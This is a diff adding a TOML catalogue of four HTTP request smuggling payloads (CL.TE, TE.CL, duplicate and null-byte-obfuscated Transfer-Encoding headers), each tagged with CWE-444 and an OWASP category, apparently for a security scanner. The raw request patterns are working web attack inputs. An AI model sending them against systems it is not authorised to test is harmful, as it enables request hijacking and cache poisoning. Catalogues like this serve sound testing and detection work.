@@ -1,0 +1,41 @@
+# HTTP Request Smuggling Payloads
+
+[[payloads]]
+id = "hrs-001"
+name = "CL.TE Request Smuggling"
+category = "HttpRequestSmuggling"
+pattern = "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n"
+description = "HTTP Request Smuggling using Content-Length and Transfer-Encoding conflict"
+risk_level = "CRITICAL"
+cwe_id = "CWE-444"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "hrs-002"
+name = "TE.CL Request Smuggling"
+category = "HttpRequestSmuggling"
+pattern = "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
+description = "HTTP Request Smuggling exploiting TE.CL desync"
+risk_level = "CRITICAL"
+cwe_id = "CWE-444"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "hrs-003"
+name = "Transfer-Encoding Obfuscation"
+category = "HttpRequestSmuggling"
+pattern = "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n"
+description = "Request smuggling using multiple Transfer-Encoding headers"
+risk_level = "CRITICAL"
+cwe_id = "CWE-444"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "hrs-004"
+name = "Null Byte Transfer-Encoding"
+category = "HttpRequestSmuggling"
+pattern = "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: ch\x00unked\r\n\r\n"
+description = "Transfer-Encoding header with null byte obfuscation"
+risk_level = "CRITICAL"
+cwe_id = "CWE-444"
+owasp_category = "A03:2021"
